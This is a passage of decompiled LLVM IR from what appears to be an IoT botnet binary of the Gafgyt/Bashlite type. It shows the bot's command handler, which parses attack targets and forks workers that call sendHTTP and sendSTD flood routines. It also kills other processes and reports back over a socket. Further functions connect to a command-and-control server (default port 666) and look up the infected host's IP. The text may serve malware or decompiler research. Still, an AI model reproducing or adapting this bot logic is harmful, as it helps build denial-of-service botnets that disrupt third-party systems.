
dec_label_pc_10dfc:                               ; preds = %dec_label_pc_10dd8
  %v2_10e04 = load i32, i32* %v1_10de0, align 4
  store i32 %v2_10e04, i32* @r0, align 4
  store i32 ptrtoint (i32* @global_var_1c064.567 to i32), i32* @r1, align 4
  %v2_10e10 = call i32 @__GI_strtok(i32 %v2_10e04, i32 ptrtoint (i32* @global_var_1c064.567 to i32))
  %v2_10ef029 = icmp eq i32 %v2_10e10, 0
  br i1 %v2_10ef029, label %dec_label_pc_10fb4, label %dec_label_pc_10e20

dec_label_pc_10e20:                               ; preds = %dec_label_pc_10dfc, %dec_label_pc_10ed8
  %v0_10e20 = call i32 @listFork()
  %v2_10e28 = icmp eq i32 %v0_10e20, 0
  br i1 %v2_10e28, label %dec_label_pc_10e30, label %dec_label_pc_10ed8

dec_label_pc_10e30:                               ; preds = %dec_label_pc_10e20
  %v2_10e38 = load i32, i32* %v1_10de0, align 4
  store i32 %v2_10e38, i32* @r5, align 4
  %v1_10e44 = add i32 %tmp, 8
  %v1_10e48 = inttoptr i32 %v1_10e44 to i32*
  %v2_10e48 = load i32, i32* %v1_10e48, align 4
  store i32 %v2_10e48, i32* @r6, align 4
  %v1_10e54 = add i32 %tmp, 12
  %v1_10e58 = inttoptr i32 %v1_10e54 to i32*
  %v2_10e58 = load i32, i32* %v1_10e58, align 4
  store i32 %v2_10e58, i32* @r0, align 4
  %v1_10e60 = call i32 @atol(i32 %v2_10e58)
  %v3_10e6c = urem i32 %v1_10e60, 65536
  store i32 %v3_10e6c, i32* @r7, align 4
  %v1_10e78 = add i32 %tmp, 16
  %v1_10e7c = inttoptr i32 %v1_10e78 to i32*
  %v2_10e7c = load i32, i32* %v1_10e7c, align 4
  store i32 %v2_10e7c, i32* @r8, align 4
  %v1_10e88 = add i32 %tmp, 20
  %v1_10e8c = inttoptr i32 %v1_10e88 to i32*
  %v2_10e8c = load i32, i32* %v1_10e8c, align 4
  store i32 %v2_10e8c, i32* @r0, align 4
  %v1_10e94 = call i32 @atol(i32 %v2_10e8c)
  store i32 %v1_10e94, i32* @r4, align 4
  %v1_10ea0 = add i32 %tmp, 24
  %v1_10ea4 = inttoptr i32 %v1_10ea0 to i32*
  %v2_10ea4 = load i32, i32* %v1_10ea4, align 4
  store i32 %v2_10ea4, i32* @r0, align 4
  %v1_10eac = call i32 @atol(i32 %v2_10ea4)
  %v0_10eb4 = load i32, i32* @r4, align 4
  %v0_10ebc = load i32, i32* @r5, align 4
  %v0_10ec0 = load i32, i32* @r6, align 4
  %v0_10ec4 = load i32, i32* @r7, align 4
  %v0_10ec8 = load i32, i32* @r8, align 4
  %v6_10ecc = trunc i32 %v0_10ec4 to i8
  %v7_10ecc = call i32 @sendHTTP(i32 %v0_10ebc, i32 %v0_10ec0, i8 %v6_10ecc, i32 %v0_10ec8, i32 %v0_10eb4, i32 %v1_10eac)
  %v1_10ed4 = call i32 @__GI__exit(i32 0)
  unreachable

dec_label_pc_10ed8:                               ; preds = %dec_label_pc_10e20
  store i32 0, i32* @r0, align 4
  store i32 ptrtoint (i32* @global_var_1c064.567 to i32), i32* @r1, align 4
  %v2_10ee0 = call i32 @__GI_strtok(i32 0, i32 ptrtoint (i32* @global_var_1c064.567 to i32))
  %v2_10ef0 = icmp eq i32 %v2_10ee0, 0
  br i1 %v2_10ef0, label %dec_label_pc_10fb4, label %dec_label_pc_10e20

dec_label_pc_10efc:                               ; preds = %dec_label_pc_10dd8
  %v0_10efc = call i32 @listFork()
  %v2_10f04 = icmp eq i32 %v0_10efc, 0
  br i1 %v2_10f04, label %dec_label_pc_10f0c, label %dec_label_pc_112a8

dec_label_pc_10f0c:                               ; preds = %dec_label_pc_10efc
  %v2_10f14 = load i32, i32* %v1_10de0, align 4
  store i32 %v2_10f14, i32* @r5, align 4
  %v1_10f20 = add i32 %tmp, 8
  %v1_10f24 = inttoptr i32 %v1_10f20 to i32*
  %v2_10f24 = load i32, i32* %v1_10f24, align 4
  store i32 %v2_10f24, i32* @r6, align 4
  %v1_10f30 = add i32 %tmp, 12
  %v1_10f34 = inttoptr i32 %v1_10f30 to i32*
  %v2_10f34 = load i32, i32* %v1_10f34, align 4
  store i32 %v2_10f34, i32* @r0, align 4
  %v1_10f3c = call i32 @atol(i32 %v2_10f34)
  %v3_10f48 = urem i32 %v1_10f3c, 65536
  store i32 %v3_10f48, i32* @r7, align 4
  %v1_10f54 = add i32 %tmp, 16
  %v1_10f58 = inttoptr i32 %v1_10f54 to i32*
  %v2_10f58 = load i32, i32* %v1_10f58, align 4
  store i32 %v2_10f58, i32* @r8, align 4
  %v1_10f64 = add i32 %tmp, 20
  %v1_10f68 = inttoptr i32 %v1_10f64 to i32*
  %v2_10f68 = load i32, i32* %v1_10f68, align 4
  store i32 %v2_10f68, i32* @r0, align 4
  %v1_10f70 = call i32 @atol(i32 %v2_10f68)
  store i32 %v1_10f70, i32* @r4, align 4
  %v1_10f7c = add i32 %tmp, 24
  %v1_10f80 = inttoptr i32 %v1_10f7c to i32*
  %v2_10f80 = load i32, i32* %v1_10f80, align 4
  store i32 %v2_10f80, i32* @r0, align 4
  %v1_10f88 = call i32 @atol(i32 %v2_10f80)
  %v0_10f90 = load i32, i32* @r4, align 4
  %v0_10f98 = load i32, i32* @r5, align 4
  %v0_10f9c = load i32, i32* @r6, align 4
  %v0_10fa0 = load i32, i32* @r7, align 4
  %v0_10fa4 = load i32, i32* @r8, align 4
  %v6_10fa8 = trunc i32 %v0_10fa0 to i8
  %v7_10fa8 = call i32 @sendHTTP(i32 %v0_10f98, i32 %v0_10f9c, i8 %v6_10fa8, i32 %v0_10fa4, i32 %v0_10f90, i32 %v1_10f88)
  %v1_10fb0 = call i32 @__GI__exit(i32 0)
  unreachable

dec_label_pc_10fb4:                               ; preds = %dec_label_pc_10ed8, %dec_label_pc_10dfc, %dec_label_pc_10dac
  %v2_10fb8 = load i32, i32* %arg2, align 4
  store i32 ptrtoint ([4 x i8]* @global_var_1c534.746 to i32), i32* @r1, align 4
  %v3_10fc4 = inttoptr i32 %v2_10fb8 to i8*
  %v4_10fc4 = call i32 @__GI_strcoll(i8* %v3_10fc4, i32 ptrtoint ([4 x i8]* @global_var_1c534.746 to i32))
  %v2_10fcc = icmp eq i32 %v4_10fc4, 0
  br i1 %v2_10fcc, label %dec_label_pc_10fd4, label %dec_label_pc_1112c

dec_label_pc_10fd4:                               ; preds = %dec_label_pc_10fb4
  %v7_10fdc = icmp slt i32 %arg1, 4
  br i1 %v7_10fdc, label %dec_label_pc_11020, label %dec_label_pc_10fe0

dec_label_pc_10fe0:                               ; preds = %dec_label_pc_10fd4
  %v1_10fe4 = add i32 %tmp, 8
  %v1_10fe8 = inttoptr i32 %v1_10fe4 to i32*
  %v2_10fe8 = load i32, i32* %v1_10fe8, align 4
  store i32 %v2_10fe8, i32* @r0, align 4
  %v1_10ff0 = call i32 @atol(i32 %v2_10fe8)
  %tmp92 = icmp slt i32 %v1_10ff0, 1
  br i1 %tmp92, label %dec_label_pc_11020, label %dec_label_pc_11000

dec_label_pc_11000:                               ; preds = %dec_label_pc_10fe0
  %v1_11004 = add i32 %tmp, 12
  %v1_11008 = inttoptr i32 %v1_11004 to i32*
  %v2_11008 = load i32, i32* %v1_11008, align 4
  store i32 %v2_11008, i32* @r0, align 4
  %v1_11010 = call i32 @atol(i32 %v2_11008)
  %v5_1101c = icmp sgt i32 %v1_11010, 0
  br i1 %v5_1101c, label %dec_label_pc_11038, label %dec_label_pc_11020

dec_label_pc_11020:                               ; preds = %dec_label_pc_11000, %dec_label_pc_10fe0, %dec_label_pc_10fd4
  %v2_11024 = load i32, i32* @global_var_265cc.54, align 4
  %v3_11030 = call i32 @sockprintf(i32 %v2_11024, i32 ptrtoint ([27 x i8]* @global_var_1c538.748 to i32))
  br label %dec_label_pc_112a8

dec_label_pc_11038:                               ; preds = %dec_label_pc_11000
  %v1_1103c = add i32 %tmp, 4
  %v1_11040 = inttoptr i32 %v1_1103c to i32*
  %v2_11040 = load i32, i32* %v1_11040, align 4
  %v2_11050 = load i32, i32* %v1_10fe8, align 4
  store i32 %v2_11050, i32* @r0, align 4
  %v1_11058 = call i32 @atol(i32 %v2_11050)
  %v2_1106c = load i32, i32* %v1_11008, align 4
  store i32 %v2_1106c, i32* @r0, align 4
  %v1_11074 = call i32 @atol(i32 %v2_1106c)
  %v2_1108c = call i32 @__GI_strchr(i32 %v2_11040, i32 44)
  %v2_11094 = icmp eq i32 %v2_1108c, 0
  br i1 %v2_11094, label %dec_label_pc_11104, label %dec_label_pc_1109c

dec_label_pc_1109c:                               ; preds = %dec_label_pc_11038
  store i32 %v2_11040, i32* @r0, align 4
  store i32 ptrtoint (i32* @global_var_1c064.567 to i32), i32* @r1, align 4
  %v2_110a8 = call i32 @__GI_strtok(i32 %v2_11040, i32 ptrtoint (i32* @global_var_1c064.567 to i32))
  %v2_110f826 = icmp eq i32 %v2_110a8, 0
  br i1 %v2_110f826, label %dec_label_pc_1112c, label %dec_label_pc_110b8

dec_label_pc_110b8:                               ; preds = %dec_label_pc_1109c, %dec_label_pc_110e0
  %storemerge1227 = phi i32 [ %v2_110e8, %dec_label_pc_110e0 ], [ %v2_110a8, %dec_label_pc_1109c ]
  %v0_110b8 = call i32 @listFork()
  %v2_110c0 = icmp eq i32 %v0_110b8, 0
  br i1 %v2_110c0, label %dec_label_pc_110c8, label %dec_label_pc_110e0

dec_label_pc_110c8:                               ; preds = %dec_label_pc_110b8
  %v4_110d4 = call i32 @sendSTD(i32 %storemerge1227, i32 %v1_11058, i32 %v1_11074, i32 0)
  %v1_110dc = call i32 @__GI__exit(i32 0)
  unreachable

dec_label_pc_110e0:                               ; preds = %dec_label_pc_110b8
  store i32 0, i32* @r0, align 4
  store i32 ptrtoint (i32* @global_var_1c064.567 to i32), i32* @r1, align 4
  %v2_110e8 = call i32 @__GI_strtok(i32 0, i32 ptrtoint (i32* @global_var_1c064.567 to i32))
  %v2_110f8 = icmp eq i32 %v2_110e8, 0
  br i1 %v2_110f8, label %dec_label_pc_1112c, label %dec_label_pc_110b8

dec_label_pc_11104:                               ; preds = %dec_label_pc_11038
  %v0_11104 = call i32 @listFork()
  %v2_1110c = icmp eq i32 %v0_11104, 0
  br i1 %v2_1110c, label %dec_label_pc_11114, label %dec_label_pc_112a8

dec_label_pc_11114:                               ; preds = %dec_label_pc_11104
  %v4_11120 = call i32 @sendSTD(i32 %v2_11040, i32 %v1_11058, i32 %v1_11074, i32 0)
  %v1_11128 = call i32 @__GI__exit(i32 0)
  unreachable

dec_label_pc_1112c:                               ; preds = %dec_label_pc_110e0, %dec_label_pc_1109c, %dec_label_pc_10fb4
  %v2_11130 = load i32, i32* %arg2, align 4
  store i32 ptrtoint ([9 x i8]* @global_var_1c554.750 to i32), i32* @r1, align 4
  %v3_1113c = inttoptr i32 %v2_11130 to i8*
  %v4_1113c = call i32 @__GI_strcoll(i8* %v3_1113c, i32 ptrtoint ([9 x i8]* @global_var_1c554.750 to i32))
  %v2_11144 = icmp eq i32 %v4_1113c, 0
  br i1 %v2_11144, label %dec_label_pc_1114c, label %dec_label_pc_11280

dec_label_pc_1114c:                               ; preds = %dec_label_pc_1112c
  br label %dec_label_pc_111f0

dec_label_pc_11160:                               ; preds = %dec_label_pc_111f0, %dec_label_pc_11224
  %v3_11164 = mul i32 %storemerge10, 4
  %v2_11170 = load i32, i32* @global_var_2c854.75, align 4
  %v2_11174 = add i32 %v2_11170, %v3_11164
  %v1_11178 = inttoptr i32 %v2_11174 to i32*
  %v2_11178 = load i32, i32* %v1_11178, align 4
  %v2_1117c = icmp eq i32 %v2_11178, 0
  br i1 %v2_1117c, label %dec_label_pc_111e4, label %dec_label_pc_11184

dec_label_pc_11184:                               ; preds = %dec_label_pc_11160
  %v2_1119c = load i32, i32* %v1_11178, align 4
  store i32 %v2_1119c, i32* @r4, align 4
  %v0_111a0 = call i32 @__libc_getpid()
  %v0_111a8 = load i32, i32* @r4, align 4
  %v9_111a8 = icmp eq i32 %v0_111a8, %v0_111a0
  br i1 %v9_111a8, label %dec_label_pc_111e4, label %dec_label_pc_111b0

dec_label_pc_111b0:                               ; preds = %dec_label_pc_11184
  %v0_111d4 = call i32 @kill()
  %v1_111dc = add i32 %stack_var_-44.1, 1
  br label %dec_label_pc_111e4

dec_label_pc_111e4:                               ; preds = %dec_label_pc_11184, %dec_label_pc_11160, %dec_label_pc_111b0
  %stack_var_-44.0 = phi i32 [ %stack_var_-44.1, %dec_label_pc_11160 ], [ %stack_var_-44.1, %dec_label_pc_11184 ], [ %v1_111dc, %dec_label_pc_111b0 ]
  %v1_111e8 = add i32 %storemerge10, 1
  br label %dec_label_pc_111f0

dec_label_pc_111f0:                               ; preds = %dec_label_pc_1114c, %dec_label_pc_111e4
  %stack_var_-44.1 = phi i32 [ 0, %dec_label_pc_1114c ], [ %stack_var_-44.0, %dec_label_pc_111e4 ]
  %storemerge10 = phi i32 [ 0, %dec_label_pc_1114c ], [ %v1_111e8, %dec_label_pc_111e4 ]
  %v5_11208 = load i32, i32* @global_var_265d8.73, align 4
  %v9_1121c = icmp eq i32 %v5_11208, 0
  br i1 %v9_1121c, label %dec_label_pc_11224, label %dec_label_pc_11160

dec_label_pc_11224:                               ; preds = %dec_label_pc_111f0
  %v2_11208 = load i32, i32* @global_var_265d4.72, align 4
  store i32 0, i32* @r2, align 4
  %tmp100 = icmp ugt i32 %v2_11208, %storemerge10
  br i1 %tmp100, label %dec_label_pc_11160, label %dec_label_pc_11244

dec_label_pc_11244:                               ; preds = %dec_label_pc_11224
  %tmp93 = icmp slt i32 %stack_var_-44.1, 1
  %v2_11270 = load i32, i32* @global_var_265cc.54, align 4
  br i1 %tmp93, label %dec_label_pc_1126c, label %dec_label_pc_11250

dec_label_pc_11250:                               ; preds = %dec_label_pc_11244
  store i32 %stack_var_-44.1, i32* @r2, align 4
  %v3_11264 = call i32 @sockprintf(i32 %v2_11270, i32 ptrtoint ([11 x i8]* @global_var_1c560.754 to i32))
  br label %dec_label_pc_11280

dec_label_pc_1126c:                               ; preds = %dec_label_pc_11244
  %v3_1127c = call i32 @sockprintf(i32 %v2_11270, i32 ptrtoint ([13 x i8]* @global_var_1c56c.756 to i32))
  br label %dec_label_pc_11280

dec_label_pc_11280:                               ; preds = %dec_label_pc_1112c, %dec_label_pc_11250, %dec_label_pc_1126c
  %v2_11284 = load i32, i32* %arg2, align 4
  store i32 ptrtoint ([10 x i8]* @global_var_1c57c.758 to i32), i32* @r1, align 4
  %v3_11290 = inttoptr i32 %v2_11284 to i8*
  %v4_11290 = call i32 @__GI_strcoll(i8* %v3_11290, i32 ptrtoint ([10 x i8]* @global_var_1c57c.758 to i32))
  %v2_11298 = icmp eq i32 %v4_11290, 0
  br i1 %v2_11298, label %dec_label_pc_112a0, label %dec_label_pc_112a8

dec_label_pc_112a0:                               ; preds = %dec_label_pc_11280
  %v1_112a4 = call i32 @__GI_exit(i32 0)
  br label %dec_label_pc_112a8

dec_label_pc_112a8:                               ; preds = %dec_label_pc_10a58, %dec_label_pc_109f0, %dec_label_pc_10efc, %dec_label_pc_11104, %dec_label_pc_11280, %dec_label_pc_10a7c, %dec_label_pc_10608, %dec_label_pc_10dcc, %dec_label_pc_105a0, %dec_label_pc_11020, %dec_label_pc_10bcc, %dec_label_pc_10888, %dec_label_pc_1071c, %dec_label_pc_10640, %dec_label_pc_10538, %dec_label_pc_10500, %dec_label_pc_112a0
  %v24_112ac = phi i32 [ %v0_10efc, %dec_label_pc_10efc ], [ %v0_11104, %dec_label_pc_11104 ], [ %v4_11290, %dec_label_pc_11280 ], [ %v0_10a7c, %dec_label_pc_10a7c ], [ 0, %dec_label_pc_10608 ], [ 0, %dec_label_pc_10dcc ], [ 0, %dec_label_pc_105a0 ], [ %v3_11030, %dec_label_pc_11020 ], [ %v3_10bdc, %dec_label_pc_10bcc ], [ %v3_10898, %dec_label_pc_10888 ], [ %v3_10740, %dec_label_pc_1071c ], [ %v0_10618, %dec_label_pc_10640 ], [ %v3_10554, %dec_label_pc_10538 ], [ %v3_10510, %dec_label_pc_10500 ], [ %v1_112a4, %dec_label_pc_112a0 ], [ 0, %dec_label_pc_109f0 ], [ 0, %dec_label_pc_10a58 ]
  store i32 %v3_104cc, i32* @r4, align 4
  store i32 %v6_104cc, i32* @r5, align 4
  store i32 %v9_104cc, i32* @r6, align 4
  store i32 %v12_104cc, i32* @r7, align 4
  store i32 %v15_104cc, i32* @r8, align 4
  store i32 %v18_104cc, i32* @fp, align 4
  ret i32 %v24_112ac

; uselistorder directives
  uselistorder i32 %v2_11270, { 1, 0 }
  uselistorder i32 %stack_var_-44.1, { 0, 1, 2, 4, 3 }
  uselistorder i32 %v2_110e8, { 1, 0 }
  uselistorder i32 %v1_11074, { 1, 0 }
  uselistorder i32 %v1_11058, { 1, 0 }
  uselistorder i32 %v2_11040, { 2, 1, 0, 3 }
  uselistorder i32* %v1_10de0, { 2, 0, 1, 3 }
  uselistorder i32 %v2_10d4c, { 1, 0 }
  uselistorder i32 %storemerge5, { 1, 0 }
  uselistorder i32 %storemerge6, { 1, 0 }
  uselistorder i32 %v1_10c3c, { 1, 0 }
  uselistorder i32 %v1_10c20, { 1, 0 }
  uselistorder i32 %v1_10c04, { 1, 0 }
  uselistorder i32 %v2_10bec, { 2, 1, 0, 3 }
  uselistorder i32 %v2_10a60, { 1, 0 }
  uselistorder i32 %storemerge7, { 1, 0 }
  uselistorder i32 %storemerge8, { 1, 0 }
  uselistorder i32 %storemerge9, { 1, 0 }
  uselistorder i32 %v1_108f8, { 1, 0 }
  uselistorder i32 %v1_108dc, { 1, 0 }
  uselistorder i32 %v1_108c0, { 1, 0 }
  uselistorder i32 %v2_108a8, { 2, 1, 0, 3 }
  uselistorder i32* %stack_var_-4, { 1, 0 }
  uselistorder i32 %tmp, { 7, 8, 9, 10, 11, 12, 13, 14, 2, 3, 4, 5, 6, 15, 1, 16, 17, 18, 19, 0, 20, 21, 22, 25, 24, 23, 26, 27, 28, 29, 30, 31, 32 }
  uselistorder i32 (i32, i32, i32, i32)* @sendSTD, { 1, 0 }
  uselistorder i32 (i32, i32, i32, i32, i32, i32, i32)* @sendTCP, { 1, 0 }
  uselistorder i32 (i32, i32, i32, i32, i32, i32, i32, i32)* @sendUDP, { 1, 0 }
  uselistorder i32 ptrtoint (i32* @global_var_1c064.567 to i32), { 2, 10, 3, 11, 1, 12, 4, 13, 0, 14, 5, 15, 6, 16, 7, 17, 8, 18, 9, 19 }
  uselistorder i32 1000, { 3, 2, 1, 0 }
  uselistorder i32* @global_var_2c850.718, { 0, 2, 1, 3 }
  uselistorder i32 ()* @getdtablesize, { 1, 0 }
  uselistorder i32 ptrtoint ([5 x i8]* @global_var_1b1ec.56 to i32), { 0, 2, 1 }
  uselistorder label %dec_label_pc_112a8, { 16, 4, 3, 9, 2, 7, 10, 5, 0, 1, 11, 12, 13, 6, 8, 14, 15 }
  uselistorder label %dec_label_pc_11280, { 2, 1, 0 }
  uselistorder label %dec_label_pc_111f0, { 1, 0 }
  uselistorder label %dec_label_pc_111e4, { 2, 0, 1 }
  uselistorder label %dec_label_pc_11160, { 1, 0 }
  uselistorder label %dec_label_pc_110b8, { 1, 0 }
  uselistorder label %dec_label_pc_10e20, { 1, 0 }
  uselistorder label %dec_label_pc_10dac, { 2, 0, 1, 3 }
  uselistorder label %dec_label_pc_10d00, { 1, 0 }
  uselistorder label %dec_label_pc_10cc0, { 1, 0 }
  uselistorder label %dec_label_pc_10c88, { 1, 0 }
  uselistorder label %dec_label_pc_10be4, { 1, 0 }
  uselistorder label %dec_label_pc_10a0c, { 1, 0 }
  uselistorder label %dec_label_pc_109cc, { 1, 0 }
  uselistorder label %dec_label_pc_10994, { 1, 0 }
  uselistorder label %dec_label_pc_10950, { 1, 0 }
  uselistorder label %dec_label_pc_108a0, { 1, 0 }
  uselistorder label %dec_label_pc_105e4, { 1, 0 }
}

define i32 @initConnection() local_unnamed_addr {
entry:
  %stack_var_-4116 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v3_1132c = load i32, i32* @fp, align 4
  store i32 70452, i32* %stack_var_-4, align 4
  %v2_11330 = ptrtoint i32* %stack_var_-4 to i32
  store i32 %v2_11330, i32* @fp, align 4
  %v2_11344 = ptrtoint i32* %stack_var_-4116 to i32
  store i32 4096, i32* @r2, align 4
  %v2_11354 = bitcast i32* %stack_var_-4116 to i8*
  %v3_11354 = call i32 @__GI_memset(i8* %v2_11354, i32 0)
  %v2_1135c = load i32, i32* @global_var_265cc.54, align 4
  %v2_11360 = icmp eq i32 %v2_1135c, 0
  br i1 %v2_11360, label %dec_label_pc_11384, label %dec_label_pc_11368

dec_label_pc_11368:                               ; preds = %entry
  %v1_11374 = call i32 @__libc_close(i32 %v2_1135c)
  store i32 0, i32* @global_var_265cc.54, align 4
  br label %dec_label_pc_11384

dec_label_pc_11384:                               ; preds = %entry, %dec_label_pc_11368
  %v2_11388 = load i32, i32* @global_var_26180.761, align 4
  %v2_1138c = icmp eq i32 %v2_11388, 0
  br i1 %v2_1138c, label %dec_label_pc_113b8, label %dec_label_pc_113a4

dec_label_pc_113a4:                               ; preds = %dec_label_pc_11384
  %v1_113ac = add i32 %v2_11388, 1
  br label %dec_label_pc_113b8

dec_label_pc_113b8:                               ; preds = %dec_label_pc_11384, %dec_label_pc_113a4
  %storemerge1 = phi i32 [ %v1_113ac, %dec_label_pc_113a4 ], [ 0, %dec_label_pc_11384 ]
  store i32 %storemerge1, i32* @global_var_26180.761, align 4
  %v4_113d0 = mul i32 %storemerge1, 4
  %v5_113d0 = add i32 %v4_113d0, ptrtoint ([19 x i8]** @global_var_2617c.763 to i32)
  %v6_113d0 = inttoptr i32 %v5_113d0 to i32*
  %v7_113d0 = load i32, i32* %v6_113d0, align 4
  %v2_113dc = inttoptr i32 %v7_113d0 to i8*
  %v3_113dc = call i32 @strcpy(i32 %v2_11344, i8* %v2_113dc)
  %v2_11400 = call i32 @__GI_strchr(i32 %v2_11344, i32 58)
  %v2_11408 = icmp eq i32 %v2_11400, 0
  br i1 %v2_11408, label %dec_label_pc_11468, label %dec_label_pc_11410

dec_label_pc_11410:                               ; preds = %dec_label_pc_113b8
  %v2_11424 = call i32 @__GI_strchr(i32 %v2_11344, i32 58)
  %v1_1142c = add i32 %v2_11424, 1
  store i32 %v1_1142c, i32* @r0, align 4
  %v1_11434 = call i32 @atol(i32 %v1_1142c)
  %v2_11454 = call i32 @__GI_strchr(i32 %v2_11344, i32 58)
  %v3_11464 = inttoptr i32 %v2_11454 to i8*
  store i8 0, i8* %v3_11464, align 1
  br label %dec_label_pc_11468

dec_label_pc_11468:                               ; preds = %dec_label_pc_113b8, %dec_label_pc_11410
  %stack_var_-20.0 = phi i32 [ 666, %dec_label_pc_113b8 ], [ %v1_11434, %dec_label_pc_11410 ]
  %v0_11474 = call i32 @socket()
  store i32 %v0_11474, i32* @global_var_265cc.54, align 4
  %v4_114a8 = call i32 @connectTimeout(i32 %v0_11474, i32 %v2_11344, i32 %stack_var_-20.0, i32 30)
  %v2_114b0 = icmp eq i32 %v4_114a8, 0
  %. = zext i1 %v2_114b0 to i32
  store i32 %v3_1132c, i32* @fp, align 4
  ret i32 %.

; uselistorder directives
  uselistorder i32 %v2_11344, { 2, 0, 1, 3, 4 }
  uselistorder i32* %stack_var_-4, { 1, 0 }
  uselistorder i32 (i32)* @atol, { 36, 35, 34, 33, 32, 31, 30, 29, 28, 27, 26, 25, 24, 23, 22, 21, 20, 19, 18, 17, 16, 15, 14, 13, 12, 11, 10, 9, 8, 7, 6, 5, 4, 3, 2, 1, 0 }
  uselistorder label %dec_label_pc_11468, { 1, 0 }
  uselistorder label %dec_label_pc_113b8, { 1, 0 }
  uselistorder label %dec_label_pc_11384, { 1, 0 }
}

define i32 @getOurIP() local_unnamed_addr {
entry:
  %stack_var_-4182 = alloca i32, align 4
  %stack_var_-4200 = alloca i32, align 4
  %stack_var_-4168 = alloca i8, align 1
  %stack_var_-72 = alloca i32, align 4
  %stack_var_-68 = alloca i32, align 4
  %stack_var_-52 = alloca i32, align 4
  %stack_var_-4208 = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %v3_114f8 = load i32, i32* @fp, align 4
  store i32 %v3_114f8, i32* %stack_var_-16, align 4
  %v0_11514 = call i32 @socket()
  %v3_11524 = icmp eq i32 %v0_11514, -1
  br i1 %v3_11524, label %dec_label_pc_1152c, label %dec_label_pc_1153c

dec_label_pc_1152c:                               ; preds = %entry
  br label %dec_label_pc_117a4

dec_label_pc_1153c:                               ; preds = %entry
  store i32 2, i32* %stack_var_-52, align 4
  store i32 ptrtoint ([8 x i8]* @global_var_1c588.765 to i32), i32* @r0, align 4
  %v2_11580 = call i32 @inet_addr(i32 ptrtoint ([8 x i8]* @global_var_1c588.765 to i32))
  %v1_11590 = call i32 @htons(i32 53)
  %v3_115b4 = bitcast i32* %stack_var_-52 to %sockaddr*
  %v4_115b4 = call i32 @__libc_connect(i32 %v0_11514, %sockaddr* %v3_115b4, i32 16)
  %v3_115c4 = icmp eq i32 %v4_115b4, -1
  br i1 %v3_115c4, label %dec_label_pc_115cc, label %dec_label_pc_115dc

dec_label_pc_115cc:                               ; preds = %dec_label_pc_1153c
  br label %dec_label_pc_117a4

dec_label_pc_115dc:                               ; preds = %dec_label_pc_1153c
  store i32 16, i32* %stack_var_-72, align 4
  %v2_115e4 = ptrtoint i32* %stack_var_-68 to i32
  %v2_115e8 = ptrtoint i32* %stack_var_-72 to i32
  %v5_115f4 = bitcast i32* %stack_var_-68 to %sockaddr*
  %v6_115f4 = call i32 @__GI_getsockname(i32 %v0_11514, %sockaddr* %v5_115f4, i32 %v2_115e8, i32 %v2_115e4, i32 16)
  %v3_11604 = icmp eq i32 %v6_115f4, -1
  br i1 %v3_11604, label %dec_label_pc_1160c, label %dec_label_pc_1161c

dec_label_pc_1160c:                               ; preds = %dec_label_pc_115dc
  br label %dec_label_pc_117a4

dec_label_pc_1161c:                               ; preds = %dec_label_pc_115dc
  store i32 ptrtoint (i32* @global_var_2c848.477 to i32), i32* @r2, align 4
  %v4_11630 = call i32 @__libc_open(i8* getelementptr inbounds ([16 x i8], [16 x i8]* @global_var_1c590.768, i32 0, i32 0), i32 0)
  %v2_116c8 = ptrtoint i8* %stack_var_-4168 to i32
  br label %dec_label_pc_116c0

dec_label_pc_11640:                               ; preds = %dec_label_pc_116c0
  %v4_11654 = call i32 @strstr(i32 %v2_116c8, i8* getelementptr inbounds ([11 x i8], [11 x i8]* @global_var_1c5a0.770, i32 0, i32 0))
  %v2_1165c = icmp eq i32 %v4_11654, 0
  br i1 %v2_1165c, label %dec_label_pc_116a4, label %dec_label_pc_11684.preheader

dec_label_pc_11684.preheader:                     ; preds = %dec_label_pc_11640
  %v2_116889 = load i8, i8* %stack_var_-4168, align 1
  %v7_1168c13 = icmp eq i8 %v2_116889, 9
  br i1 %v7_1168c13, label %dec_label_pc_11694, label %dec_label_pc_11678

dec_label_pc_11678:                               ; preds = %dec_label_pc_11684.preheader, %dec_label_pc_11678
  %v4_1168414 = phi i32 [ %v1_1167c, %dec_label_pc_11678 ], [ %v2_116c8, %dec_label_pc_11684.preheader ]
  %v1_1167c = add i32 %v4_1168414, 1
  %v5_11680 = inttoptr i32 %v1_1167c to i8*
  %v2_11688 = load i8, i8* %v5_11680, align 1
  %v7_1168c = icmp eq i8 %v2_11688, 9
  br i1 %v7_1168c, label %dec_label_pc_11694, label %dec_label_pc_11678

dec_label_pc_11694:                               ; preds = %dec_label_pc_11678, %dec_label_pc_11684.preheader
  %storemerge3.lcssa = phi i8* [ %stack_var_-4168, %dec_label_pc_11684.preheader ], [ %v5_11680, %dec_label_pc_11678 ]
  store i8 0, i8* %storemerge3.lcssa, align 1
  br label %dec_label_pc_116e8

dec_label_pc_116a4:                               ; preds = %dec_label_pc_11640
  store i32 4096, i32* @r2, align 4
  %v3_116bc = call i32 @__GI_memset(i8* nonnull %stack_var_-4168, i32 0)
  br label %dec_label_pc_116c0

dec_label_pc_116c0:                               ; preds = %dec_label_pc_1161c, %dec_label_pc_116a4
  %v4_116d8 = call i32 @fdgets(i32 %v2_116c8, i32 4096, i32 %v4_11630, i32 %v2_116c8)
  %v2_116e0 = icmp eq i32 %v4_116d8, 0
  br i1 %v2_116e0, label %dec_label_pc_116e8, label %dec_label_pc_11640

dec_label_pc_116e8:                               ; preds = %dec_label_pc_116c0, %dec_label_pc_11694
  %v1_116ec = call i32 @__libc_close(i32 %v4_11630)
  %v4_116fc = load i8, i8* %stack_var_-4168, align 1
  %v2_11700 = icmp eq i8 %v4_116fc, 0
  br i1 %v2_11700, label %dec_label_pc_11798, label %dec_label_pc_11708

dec_label_pc_11708:                               ; preds = %dec_label_pc_116e8
  %v2_11710 = ptrtoint i32* %stack_var_-4200 to i32
  %v3_11728 = call i32 @strcpy(i32 %v2_11710, i8* nonnull %stack_var_-4168)
  %v3_11748 = call i32 @ioctl(i32 %v0_11514, i32 35111, i32 %v2_11710)
  %v2_11768 = ptrtoint i32* %stack_var_-4182 to i32
  br label %dec_label_pc_11758

dec_label_pc_11758:                               ; preds = %dec_label_pc_11708, %dec_label_pc_11758
  %storemerge47 = phi i32 [ 0, %dec_label_pc_11708 ], [ %v1_11784, %dec_label_pc_11758 ]
  %v2_11770 = add i32 %storemerge47, %v2_11768
  %v1_11774 = inttoptr i32 %v2_11770 to i8*
  %v2_11774 = load i8, i8* %v1_11774, align 1
  %v4_1177c = add i32 %storemerge47, ptrtoint (i32* @global_var_265dc.772 to i32)
  %v5_1177c = inttoptr i32 %v4_1177c to i8*
  store i8 %v2_11774, i8* %v5_1177c, align 1
